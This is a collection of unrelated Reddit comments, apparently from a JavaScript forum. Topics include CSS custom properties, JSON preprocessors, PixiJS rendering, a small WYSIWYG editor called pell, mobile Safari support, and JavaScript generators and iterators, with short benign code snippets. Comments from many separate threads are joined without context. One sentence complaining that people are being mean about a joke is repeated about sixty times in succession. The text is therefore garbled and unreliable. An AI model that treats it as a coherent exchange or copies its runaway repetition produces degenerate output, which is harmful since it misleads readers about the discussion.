[Image](https://imgs.xkcd.com/comics/standards.png) [Mobile](https://m.xkcd.com/927/) **Title:** Standards **Title-text:** Fortunately, the charging one has been solved now that we've all standardized on mini\-USB\. Or is it micro\-USB? Shit\. [Comic Explanation](https://www.explainxkcd.com/wiki/index.php/927#Explanation) **Stats:** This comic has been referenced 4645 times, representing 2.8561% of referenced xkcds. --- ^[xkcd.com](https://www.xkcd.com) ^| ^[xkcd sub](https://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](https://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_dk0ort0)
Is your server serving the production build from the `build` folder? If so you might be running into the default service worker. You can enable ["Bypass for network"](https://developers.google.com/web/fundamentals/getting-started/codelabs/debugging-service-workers/#inspecting_the_service_workers) from the Application tab in Chrome DevTools.
What do you mean by separate instances and why should the resolutions be different? In my example, is that not a separate physics instance that uses object.body and a renderer instance that uses the object.sprite? Regarding WhitestormJS, do you think a 3D game engine implementation would be very similar to a 2D one like what I am trying to do? I couldn't find a custom physics engine implementation with WhitestormJS there.
meh... not the first, not the last. but yea, everyone and every firm has different perspective and use case.
JSON with Extensions is not really a new "standard". It's more like a preprocessor - you can always convert JSON XI to "vanilla" ye old' JSON. Think like SCSS in CSS. Or dare I say Babel with ES6/ES7/ES8 etc. in JavaScript ;-) I know accepting change is hard ;-) Cheers.
meh ... another accepting change is hard comment ;-) FYI: The [Awesome JSON - What's Next?](https://github.com/datatxt/awesome-json-next) collection / page lists more alternative formats incl. JSON5, HJSON, HanSON, SON, CSON, USON, etc. Cheers.
I don't think it clears any cache automatically, but once you have refreshed the page it knows that the old cached data for that resource is no longer valid. I would not expect other resources that have cached content to be removed from the cache (unless they have been re-requested in the meantime too).
Is it common to use the `--` for this? This syntax looks messy
js vars have scope and are easy to edit in the browser inspector, too.
keyframe animations are web standards and work in all browsers natively. React is not and will disappear one day.
So this is backed by TC39 or some other body, and has got some planned browser support / roadmap for browser support? Or is this just (as said elsewhere) yet another "transpile to real data"? I don't see anything in the github that says about standards or working commitees or firefox or chrome or edge/ie or mobile browser support, nor does it seem backwards compatible, or supported by any other languages at this present time. 
If you only need to do this while developing, you can use the CacheKiller plugin for Chrome: https://chrome.google.com/webstore/detail/cache-killer/jpfbieopdmepaolggioebjmedmclkbap
…common? it’s the CSS standard, so you *can only* use `--`
That's the standard syntax for CSS variables. There was some desire to *not* use `$` to allow that to be used for something else variable-like, especially involving selectors.
Actually, OP just swapped x and y. It is atan2(y, x) and not the other way around. So: gun.rot = Math.atan2(mouseY - player.y, mouseX - player.x) should work.
Sorry, I've not got the time to check your code. I expect your render function will check the position of the bodies and apply them to your scene. You will scale up your bodies positions to meet your canvas ones to keep things performant. I know WHS have put in a lot of effort here. Might have been something to copy. 
I don't really know how to use codepen but the example is here : https://codepen.io/anon/pen/rwQLgQ
&gt; https://codepen.io/anon/pen/rwQLgQ It's not very good though :)
In cases like this, using JSFiddle (or similar) would be much more helpful than pastebin, as it would allow us to start playing around with the code at once. **Edit:** Tried to make it work in JSFiddle for 5 minutes, but i don't get much of anything. [https://jsfiddle.net/6z5eb92c/](https://jsfiddle.net/6z5eb92c/)
Your example still looks jaggy to me. I'm thinking it has something to do with the display resolution and the texture filter or resolution, but I don't really know what to do there.
&gt; yet another "transpile to real data"? Yes, this is just another preprocessor for JSON - backed by a living body, that is, a human ;-). FYI: JSON is just another data format and JavaScript is just another scripting language and last but not least you are just another living body. Nothing wrong with being just another ;-) Let's celebrate diversity. Live and let live. Cheers. 
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
It's obviously not real and just a joke, idk why people like you have to come on here and be mean.
I have plenty of experience with firebase, but I'm not familiar with chart.js. I would assume chart.js takes a JSON object and visualizes it? I would recommend taking a look at the firebase docs about reading data from your database [here](https://firebase.google.com/docs/database/web/read-and-write). Then once you get the hang of that, store your JSON in a variable and use it with chart.js
Are you expecting anti-aliasing? Also, setting width / height of generated sprite after generating it at the same size is probably causing the error I'm having trouble replicating. https://codepen.io/anon/pen/rwQLgQ
or just use a square sprite and use scale to size it
This is what I see in that codepen https://screencast.com/t/TBU0o7Qh7 It's not always the same way, but it is as if it is definitely not standing straight, but those little jags you see are definitely multiple pixels on my screen, so it's not like it's the screen.
Indeed, but I'd rather not spend any time and energy learning an idea that just goes the way of betamax (and that at least had some backing). There are hundreds if not thousands of "nice ideas" out there - all of which are a waste of time, because none of them will be adopted and infact implementing them other than for your own personal usage, will only help to complicate code and bring in dependencies (what if there is an issue, and there is no longer a maintainer of the standard?) - its too unstable, and unreliable to consider. 
You can do cool stuff with the paged media module that are impossible in JS. Page numbers (page x of x on footer of each page, links saying "see page y"), per-page titles, etc.
Bloat. Ugly, useless bloat. I want my kilobytes back.
All things start small. Kind of ironic - who is the maintainer of the JSON "standard"? how can we fix "vanilla" JSON? where can I file issues? According to your definition JSON is practically dead, or isn't it?
Everything about this is awesome. I'm not a D&amp;D player, but the fact that you made a Twitter bot with Node that is running on a PI3 is awesome.
It looks as if pixi isn't using linear filtering on the textures... there should be a texture filter setting for that. When I use a physics engine, the physics objects are the source of truth. If I want to move something I move the body, and always use the body position/orentation to render the sprite. So using matter and pixi, I would make the update/render loop something like: doFrame() { const dt = // compute elapsed time update(dt) // update physics bodies render() // copy position &amp; orientation from bodies to sprites } 
CSS variables cascade, so you can set them on container divs for things like theming. 
Thanks a lot!! If you ever get the chance to play I highly recommend it!
Actually it looks like you just need to turn on antialiasing. [Example with antialiasing](https://codepen.io/anon/pen/mwQWBm?editors=0010#0). var renderer = PIXI.autoDetectRenderer(500, 250, {antialias: true});
Good thing the diff isn't kilobytes in length: https://github.com/facebook/react/pull/9302/files
The templates was what I was hoping for! I find that much easier to read than all the +'s
By string interpolation, you mean templates as in /u/Steve5451 's answer? I also find that easier to read! Thanks
That would be the IETF https://tools.ietf.org/html/rfc7159 If you have issues I'm sure they are happy to listen, but considering how much support it has now, I think that the standard is probably as complete as it needs to be. Definately not dead.
CSS variables are bloat and useless? Lol what
Don't want to complain because I love this library already, but it does [look a lot better in Chromium... ](http://imgur.com/a/MB7iX) at least on Linux. -Edit- Just wanted to mention that OP has since patched things up and it's looking great on both now. Thanks again! Will use in future projects :)
can you github.io demo.html? There's lots of stuff to evaluate and not having to download and install it might give you a leg up.
As someone who's never used React or JSX before, it's highly likely that I don't know what I'm talking about here, but wouldn't it be better to just declare your variables in JavaScript and pass them to the CSS property?
Maybe just me but I have some odd server error with https://jaredreich.com/pell My Chrome says "The webpage at https://jaredreich.com/pell might be temporarily down or it may have moved permanently to a new web address." Firefox is mysteriously blank. Http Log shows an NS_ERROR. codepen.io seems to be involved with an NS_BINDING_ABORTED flag My php script can fetch the index: -wapping: https://jaredreich.com/pell ~~ (#) ~About~ (#) ~Blog~ +=PELL=- the simplest and smallest WYSIWYG text editor for web, with no dependencies _ Download / Instructions / Information: ~_ View on GitHub ~ Demo: 
Wow, first improvements are DEFINITELY going to cross-browser UI fixes. Thanks for taking the time to screenshot and give feedback!
Variables that are declared in JavaScript and passed to CSS will cascade the same as variables that are declared in CSS.
There is a live demo at https://jaredreich.com/pell - check it out, would be great to get more feedback!
awesome, make sure you add that to your readme.md
This is interesting... I've tried https://jaredreich.com/pell from all my browsers and devices, and everything seems ok... I hope you're able to visit the site eventually to check out the demo! :)
Totally, I just realized that it's on the GitHub repo at the top, but that's not part of the official README. I will add it. Thanks!
comparing to React is understandable but is not representative of good existing virtual-dom SSR performance in 2017. for example, vidom, dio, svelte and inferno all get numbers much faster than React. even domvm, which has no SSR-specific optimizations and just recursively walks a plain constructed vtree gets 20x React's performance [1]. nevertheless, great work/writeup as always /u/localvoid [1] https://github.com/leeoniya/domvm/tree/245f048fd25c739675768e0fc76a36159ef77492/demos/bench/ssr
If you're talking about the large photo of the girl with glasses, it's not JS, it's just CSS. They are only very slightly animating the photo on from the left. The "wipe" is done by having a white element on top of the image that animates to the right which reveals it. In their exact case it is done with a ::before psuedo element placed on top of the photo. They simply animate it's scale to 0 off to the right. The only JS involved (which is 100% not necessary in this case), is they are using a library to determine if elements are "in view" in order to delay/start the animation. This is useful so animations don't start until you scroll down to them. But in the case of this feature image, isn't necessary since it's at the top of the page and would always be visible on load. 
[Toolbar renders poorly in Firefox 54, Windows 7](http://imgur.com/a/CyC1p)
I didn't wanted to compare different vdom libs, because obviously they won't have good results in the `search-results` benchmark. I just wanted to debunk the myth that string-based template renderers has a huge advantage over virtual dom server side renderers.
Haha brutal, I'll get that fixed up. Thanks for the feedback and screenshot!
Why mix two, If you can use pure-css(inside JavaScript...)?
Thanks, probably a dns issue on my network then.
&gt; I didn't wanted to compare different vdom libs, and yet you chose the slowest *one* to show alongside the others :/
It doesn't matter, all this numbers are useless. It just gives a rough estimate when some library has problems or can't handle some use case. Removed React from the list.
Mate! You're a life saver/genius! Thank you so much for your reply!
Thanks for the update. Let's say the JSON standard is frozen forever (or as you say complete as it needs to be) -- really just a nice way to say it's practically dead because at this point nobody cares about adding comments, etc. Thus, the practical way forward is with an extension and a preprocessor so you can enjoy the new and better ways but still stay backward-compatible (forever) ;-) Anyways, no worries. Enjoy the summer. 
No problem, glad to help. If you're curious I found out all of that by simply right-clicking and doing inspect element. You can see all the CSS and exactly how they did it. You can also remove the "inview" class that their JS is adding which activates the animation to compare the start vs the end settings as well.
Yay!
I did look at that yes, but got thrown off by the inview stuff I think - hence why I assumed it was using a parallax plugin. Thank you again!
From what I understand, it's just that they're going to go through just as other CSS properties. Which is great, but I'd be worried about browser support anyway.
&gt; It doesn't matter, all this numbers are useless. absolute numbers are useless; relative numbers are incredibly *useful*. i think it's worth showing React just because of popularity and also showing &lt;current fastest vdom SSR lib&gt;. it would be nice to have a frame of reference in the article without having to go and read Marko's posts to dig up some old-version React stats.
I can't get it to work on jsfiddle either...I did not include all of the code, but it should still work..... I guess I'll try to figure it out myself...do you have any faint idea based on all of that code?
No shame there, everyone starts somewhere and to be honest I would not have assumed you were a beginner creating a simple first app based on how this one worked out. So kudos on that. That said, my recommendation as as someone only slightly further down the road would be if you are serious about staying involved with ReactNative, it's a huge savings to create your own re-usable component and UI packs. Stuff like the built-in IOS loading indicator save development time, but takes it back when you have to then write separate code for an android loading indicator and separate components/containers being loaded in both your ios and android file. Re-usable pure JSX components will allow you to re-use a ton more code and basically develop both versions currently. With an exception to absolute platform specific code, of course. 
Will definitely check this out more when I get off, I was already on Mac so never really explored it. Does it get rid of the requirements to certify / publish from Mac or just XCode's involvement? 
Ok, brought back React results :)
Yes.
\*sigh\* :D
I don't know what this is for, but the format doesn't match the date. It looks more like 'yyyy-mm-dd'.
I think that's probably what most would do considering browser support and the imperative nature of it. Still, there are probably legacy reasons or compatibility issues that call for it, better to support the full spec.
So much for newrelic
That sound incredible cool. Do you have more information about how that works?
Guys check out the new release 🔥. We worked hard on this and it will definitely make your experience flawless 😄
QoL improvement: while typing, when you click on a formatting button, don't remove focus from the text box Smaller QoL: the "standard" hotkey for b/i/u on mac is `command` Also, there's apparently a rendering bug with the toolbar; doesn't look like your sample gif: http://i.imgur.com/UFsgjwN.png Mac, Chrome
It only removes involvement of Xcode. Expo can directly run the app on the ios simulator. You can either publish it using expo or make a build that you can publish like normally you do.
Thanks ! Will definitely remember this. also Do you have any thoughts about ReactXp ?
Bangkok bank
It's a way of avoiding having your face as a preview when sharing the link.
Such good feedback... thank you!!
Luckily, I think it's mostly scroll bars messing you up.
also http://animejs.com/ http://animista.net/
I'd recommend using a more clear indicator for when an option is selected. For example a button border or highlight.
Or Y-m-d
No prob. This is a nice little library. Great work
I definitely agree. Would be much better if "bold" button is highlighted while bold action is in effect, etc... Thanks!
Browser Knows Best. It's literally in the post. 
[Using a dark GTK theme can have that effect](https://wiki.archlinux.org/index.php/firefox#Unreadable_input_fields_with_dark_GTK.2B_themes).
I'm getting a horizontal scroll bar on the text formatting area in Chrome 59.0.3071.115, Win10 x64.
I blame js.
Definitely part of the overall UI improvements that are necessary. Thanks for the feedback!
no, it's shitty programming - often the result of shitty business "requirements" with unrealistic deadlines.
Honestly, I agree with you I just hated the title and there was nothing else (that pulled up for me at least) as to what the submitter is saying so I was just piling on as we won't to do when nothing of substance is posted. 
I know you mean "requires," but the chart with the x's for jQuery and Bootstrap is a little unclear at first glance. Does an x mean the editor works with jQuery? Not compatible with jQuery?
Yeah I could probably make that table easier to understand. Basically the "x" means that the library NEEDS that dependency in order to work.
Good stuff, I'll wait for you to fix that toolbar bug and if it works well I'll probably test it later.
Also, don't use the CSS classes such as "facebook" or "ad", "ad-box". They are typically forced to display:none
I think it's great that you're giving this a crack because making libraries lighter and simpler is definitely something that always benefits the wider web, however WYSIWYG is a notoriously difficult problem to solve especially given the lack of cross browser standards in the API implementation. If you've ever managed a site which allows lay users to use wysiwygs and you want the generated markup to go on responsive website, you are going to have to have some sort of paste catching and some sort of markup cleaner (looking at you MS Word) because it's quite amazing how much bad pasted markup can screw around with a site.
i have an opinion: this website is complete and utter UX trash. it breaks native scrolling and there's not one fucking thing on it that can be easily comprehended. please refrain from replicating anything like this.
Amen to this my friend. Perhaps at the very least this lib can serve as the stripped down core of what's necessary in a WYSIWYG, and can be extensible for other requirements, or even just looked at for learning purposes...
If you're using react you can use recompose, it has a 'compose' function a load of helpful higher order functions to move you away from class based to functional components. If you're using lodash then `flowRight` is the same as R's pipe function. Happy functional!
Hahahahaha I just liked the image effect. But yeah it just seem a bit haphazard in all regards. I just like trying to figure out how to do different things, build up my skillset. 
I think at least one of us is confused about what the other is saying... .my-component { background: var(--theme-color); padding: 20px; } .my-component .inner-area { background-color: white; color: var(--theme-color); padding: 20px; } This is useful, right? Am I missing something here?
document.execCommand has cross-browser issues. For example if you bold a text in Chrome than open IE, it cann't handle bold/unbold thing.
thank you thank you
Removing overflow-x: scroll; on .pell-actionbar gets rid of the bar over the buttons, as a start.
You're right. It'll have to be tackled one inconsistency at a time :)
Sweet... thanks! Unfortunately that stops the ability to scroll horizontally to access hidden buttons when on a small/mobile screen.
max-device-width or other such things may help here.
Is this the actual code? If so, you can get the value you're trying to get from `Date.now()`.
for `.pell-actionbar` use: ` overflow-x: auto;` instead also add a `padding-bottom: 10px` [example for padding bottom](http://imgur.com/a/rmYKI) edit: auto, not scroll. d'oh!
Sweet, thank you!
"Pascal case"? I've never heard camel case referred to like this.
No. This is just an example. I need to make requests to api until I get the status I need.
Then probably put a recursive function within a promise. The function calls the API, and if the value isn't what you're looking for it calls itself again, otherwise it resolves the promise it resides in.
I forgot to add a pause between requests. Is it possible?
It would be awesome if I could add my own UI for the toolbar. For example, non coders have no idea what H1 means and my target user doesn't even speak English.
Amazing! Well done!
The country subscription form has been added https://go2cinema.com/showtimes/santa-clara-county-ca-usa-10SEG834417. The ability to show how many subscribers in the country already is added to the TODO list. Again, thank you for the feedback.
why not just use long polling?
You absolutely can do this! See below example if I wanted to use the French word "Audacieux" instead of "Bold": ``` pell.init({ actions: [ ... { name: 'bold', icon: '&lt;b&gt;A&lt;/b&gt;', title: 'Audacieux' }, ... ], ... }) ``` This is outlined in the README, under the "Usage" section
Awesome! Thanks, I missed that.
No problem, thanks for checking it out!
If there's a lot of code you need to transform, better just run babel over it and be done with it. Otherwise this would probably have to be a recursive loop like mrxyfir suggested.
This looks very nice. I actually clicked on it wondering whether Markdown might be supported. Ah well! It's pretty neat (apart from scrollbar issues!)
Looks great. Could function better on mobile is my only comment. iPhone Safari is a little buggy and doesn't fully recognize the height of the text area. All and all nice job!
Thanks! This project is kind of off-scope for a markdown editor, since that could be accomplished with a plain `&lt;textarea&gt;` and a toggling preview (something just like what GitHub uses for comments/issues/etc...)
You're right! That'll definitely be on the list for improvements, thanks for the feedback!
A project doesn't need to be "touched" to be well maintained. Some projects are very stable, have very few bugs and thus don't have a lot of activity.
Like the ones who ask for mobile/responsive design, then rip it apart until it looks like some POS from the 90s.
Why would you want the 'simplest and smallest' WYSIWYG editor for your project though? Surely wouldn't you want the one that provides the best user experience? WYSIWYG is difficult to pull off smoothly, I'd rather use a few more kB to get it right.
Why would you want the 'simplest and smallest' WYSIWYG editor for your project though? Surely wouldn't you want the one that provides the best user experience? WYSIWYG is difficult to pull off smoothly, I'd rather use a few more kB to get it right.
Perhaps your project is light and you don't want to bloat it with a 500kB editor. Perhaps you want the simplest and smallest working solution, then fork/adapt/style it for your custom needs, perhaps you like new the concept of simplifying something overcomplicated that is, at the core, simple. Etc, etc, etc... :)
WYSIWYG isn't simple at the core though. If you're using the `contenteditable` API at a bare minimum there are lots of quirks and edge cases to deal with.
WYSIWYG isn't simple at the core though. If you're using the `contenteditable` API at a bare minimum there are lots of quirks and edge cases to deal with.
Hi, everyone. I just finished this free TypeScript book last weekend and sharing it out people that may find it useful. It covers about 80% of the language and has 15 or so embedded videos to support the text (most of them under 2 minutes, but a few are longer, especially at the end). The usual author pleas go along with it - please share any feedback, give me internet points if you think it deserves it, etc. :) Thanks! (edited to correct a typo [twice])
Depending on what the user (developer) needs, it most definitely can be simple at the core (or entirely for that matter). As mentioned in other comments, a lot of those edge cases and quirks are fading away with obsolete browser versions.
I didn't see this point made, but it's in Apple's interest that mobile safari is worse than native. Anything they do to empower mobile web makes it less likely developers and businesses will go native. Native apps create user and business lock-in with Apple, and also provide profit through the 30% App Store cut. There is every incentive for Apple to do the bare minimum here for for mobile web improvements in hope developers will see more of an upside to building native apps which is what Apple wants.
[This article](https://www.smashingmagazine.com/2015/01/designing-for-print-with-css/) has a good overview, unfortunately only [Prince](https://www.princexml.com/) and Antenna House support it ([caniuse](http://caniuse.com/#feat=css-paged-media) lies, it's unsupported in Chrome).
Nice. An option to suffix the tests with spec.js would be cool
I wrote some asyncless, promiseless looping examples here (Ctrl-F "CPS looping"): https://medium.com/@b.essiambre/continuation-passing-style-patterns-for-javascript-5528449d3070
Call the next iteration of the loop through a setTimeout loop(i+1,done); becomes setTimeout(loop, miliseconds, i+1,done);
Sorry but this is completely pointless. Looks like it only works in node and is a thin wrapper around http/https anyway. https://github.com/HX3/urlJson/blob/master/index.js your library urljson.get('http://website.com/ex.json', false).then(function(result) { console.log('RESULT =&gt; ', result, '&lt;= Formatting (2) =&gt;'); }, function(error) { console.log(error); }); fetch api (html standard) fetch('http://website.com/ex.json').then(resp =&gt; resp.json()) .then(result =&gt; console.log('RESULT =&gt; ', result);
I tried to turn your GitHub links into [permanent links](https://help.github.com/articles/getting-permanent-links-to-files/) ([press **"y"**](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) to do this yourself): * [HX3/urlJson/.../**index.js** (master → 118508f)](https://github.com/HX3/urlJson/blob/118508fc9dfbe8634f6e53f8a9bf6e589a6b8530/index.js) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dk1rn03.)^.
Yea, seen that list.
Good work man. I only tested on mobile, but one thing that would be nice is what attributes are "active " 
Why is there Chinese character for road? Are you aiming for roadmap?
Totally, I agree, thanks for the feedback!
&gt; Why mix two ... while writing JSX
I wish I was that clever. Reddit auto suggested the title and I wasn't paying attention. I'll fix when I'm back at a laptop.
Yeah, spent a couple hours today looking at different editors for this reason. Finally settled on tinymce as the best (really the only that I could find) that works well when pasting into
Umm, how would you not have known this already?!
Eek. Don't scroll horizontally for mobile. Stack the buttons in another row as necessary
aaaand its 300kb now lol
The ultimate irony is when the iPhone first launched the whole vision was that with a web experience "this good" on a mobile there will be no need for apps, the only SDK was basically JS for web. The first apps on the platform were produced by crackers and reverse engineers (Cydia ultimately). Which ultimately put enough pressure on Apple to release official SDK and app development tools. http://fortune.com/2007/10/17/steve-jobs-apple-will-open-iphone-to-3rd-party-apps-in-february/
https://pastebin.com/mZ9EpatB Used string.replace to remove dots then left/right padded the row strings to shift the cells horizontally. For vertical moves I rotated the grid 90 degrees clockwise, shifted left or right then rotated 90 degrees counterclockwise. Added the three regex replaces to optimise the actions string by removing duplicate or unnecessary moves (RLR is the same as R)... My regex isn't up to scratch and there are probably better patterns to use!
the challenge is ok, the constant use of the word "beautiful" is nauseating.
This implies mobile web experience should be much better on android devices?
What.. eval isn't good enough for you? Hurrhurr. Also, for being lightweight, I noticed a bit of code duplication in basic.js
those variables arn't supported in IE. do react have polyphille to resolve this problem?
Apple championed HTML5 (Canvas, 3D transforms etc.) and was the very company that made *mobile web a thing* when they released the first iPhone with the first desktop-class mobile browser (before that it was all "WAP browsers" on cheap feature phones and Opera Mini looked like science fiction). So can we be more humble and cut down on the tinfoil conspiracy bullshit a little?
It looks like jsfiddle runs that code within a function (`window.onload=function() { {{code block}} }`) which would mean that foo is not available as a global function. Using `window.foo = function foo() {...` works (because it forces it to be accessible globally). Eg https://jsfiddle.net/o2qr0xew/
would my code work in a regular working environment?
Hello, I want to have a syntax similar to scilab but built in javascript. The project is under construction and many things change. Eval is not enough.
I would like to know the duplicate parts of basic, to evaluate the possibility of improving some aspects. Thanks 😉
Hard to be 100% certain, but I would say yes, eg this works (for example save it as index.html and open in a browser): &lt;!doctype html&gt; &lt;button id="red" onclick="foo()"&gt;Red&lt;/button&gt; &lt;button id="blue"&gt;Blue&lt;/button&gt; &lt;script&gt; function foo() { window.alert("hi") } &lt;/script&gt;
This is just because of JSFiddle. Update your JavaScript Load Type settings in JSFiddle to be `No Wrap - in &lt;body&gt;` like this: http://i.imgur.com/cxRcR7X.jpg You'll see that it works just fine. When you add this code in an actual environment, you just need to put it inside of `&lt;script&gt;&lt;/script&gt;` tags somewhere in your document's body or head and it will work.
My favorite is less than 5kB; it can be tweeted. Here's the URL. `data:text/html,&lt;body contenteditable&gt;`
Sure, Ramda and lodash have functions that let you compose and pipe functions together, but having it as a first-class construct makes the whole affair so much cleaner and nicer
bruhhh lmaooooo whaaaaat 
Not sure why no one actually gave you the answer. This should probably give you a similar solution. https://repl.it/JWI1/1
the reason, is to keep compatibility with the pre processeur: sass use $, less use @, etc. 
Not sure that a scrolling actionbar is really good UI. Why not have it break line?
It was a total joke haha
😅
You see 16-38 a couple of times
I am not getting it. 
Well, Apple still does a decent job optimizing Safari for mobile web *sites*, but when it comes to functionality that would let mobile web *apps* compete with native apps (such as Service Workers), they indeed don't seem to care at all.
I'd say Vue is more popular than Aurelia. 
Because, of course, every site you visit spawning a permanent background process on your phone sounds like an awesome idea they should implement immediately, right? The only effect I've seen from this feature is that every time I open a site I need to click "Block" on its push notifications dialog.
While I think people are right in saying that React.js and Angularjs (I'm referring to the first version unless otherwise stated) are too different to compare straight across I would argue that Angular.js V.S. React + Flux is. Keep in mind though that Flux is really Facebook's replacement to problems they found in MVC and thus is more of an conceptual idea than a discrete framework (it has subsequently been made into many different frameworks). https://artjoker.net/blog/angularjs-vs-reactjs/
The generator is not usually used when you know all the values up front but when each value is computed on-demand when the consumer calls .next(). One really neat usage of generators is in [ember-concurrency](https://ember-concurrency.com/#/docs/tutorial/refactor) where the generator allows user code to yield promises and the framework takes care of scheduling.
What does a pre-processor have to do with the code in CSS which it generates? I feel they should've done something to differentiate it, not the CSS itself. Ah well, will probably be using SCSS anyways, so I don't think I will need this, but I find it weird nonetheless.
well, behind the scenes, generators are used for [Symbol.iterator]() (which allows you to write for...of loops with arrays and maps and such) as well as async/await.
Web push notifications can seriously go to hell. Exactly what I wanted, sitting down at my computer to 83 new messages that were generate overnight by some shitty website that I accidentally allowed notifications from. This reminds me that I need to revoke access when I get back to my desk : )
Apple originally intended not to allow native apps - everything would be done on the web. However, now native apps are encouraged and Safari is clearly lagging other browsers, and since Apple take a cut from native apps it's clearly in their interest to encourage apps over the web.
What are you missing in Safari, exactly?
Navigation has been updated, if I understand correctly and now is even simpler to use. Reactnavigation.org
I think an excellent use case for iterators is when you want to write code that isn't bound to one type of collection. Your examples both deal with array-like data which can be accessed using integer indices. What if you want to write some code that can also operate on a map, which has arbitrary string keys instead of integers? It's still a collection, just organized differently. // Adapting example iterator to handle a map function makeMapIterator(map) { var keys = Object.keys(map), nextKeyIndex = 0; return { next: function() { return nextKeyIndex &lt; keys.length ? {value: map[keys[nextKeyIndex++]], done: false} : {done: true}; } }; } Now I can write a reusable function that accepts an iterator argument, and the underlying data type is irrelevant. I think this concept makes more sense in Java, which has the [Iterable](https://docs.oracle.com/javase/8/docs/api/java/lang/Iterable.html) interface.
I'm coming from a React/Redux background, so it makes sense to manage state on my own; that's essentially how all state management is done in React. That way, the state is more predictable. For example, when I have let i = 0 for my counter, I know exactly what the next value will be; i + 1. But when if I used an iterator or generator, I would need a way to store what the last value was in order to know what the next state will be. With redux, I just change a value in the global state and that state is distributed throughout the entire app, so that way, the state is "managed externally everywhere you want to iterate" and that's just a benefit of using redux. Your tree example is a good situation where'd I would use an iterator, but is something I have not encountered in an actual project yet. Seems more like a white board algorithm problem.
Look into redux sagas which may interest you more. It handles asynchronous code with generators. 
 $.ajax({ url: 'http://services.swpc.noaa.gov/products/solar-wind/plasma-5-minute.json', dataType: 'json', success: function(resp) { var time_tag = resp[1][0]; var density = resp[1][1]; ... $('#your_content_id').html(time_tag); ... } });
Not FOSS but I've had a very good experience with Redactor. The license is pretty cheap and it has a reasonably well thought through API. Never really liked the look of the Tinymce UI!
I'm surprised no one has mentioned this yet, but generators are lazy. This allows you to iterate over infinite items. function everyNumberThatExists * () { var i = 0; while (true) { yield i; i++ } } for (const number of everyNumberThatExists()) { console.log(number); if (number &gt;= 1000000) { break; } } With the asyncIterator proposal, one can use this behaviour in combination with CSP to create an async generator that lets you iterate over events the same way you'd iterate over an array: const run = (chan) =&gt; { if (chan.consumers.length &amp;&amp; chan.buffer.length) { chan.consumers.shift()(chan.buffer.shift()) } } const put = (chan, val) =&gt; { chan.buffer.push(val) run(chan) } const take = (chan, cb) =&gt; { chan.consumers.push(cb) run(chan) } const chan = () =&gt; ({ consumers: [], buffer: [], async * [Symbol.asyncIterator] () { while (true) { yield new Promise((resolve) =&gt; take(this, resolve)) } } }) const clicks = chan() document.addEventListener('click', (e) =&gt; put(clicks, e)) async function main () { for await (const click of clicks) { console.log(click.pageX) } } main()
`async/await`, for example. Look for npm module 'co'.
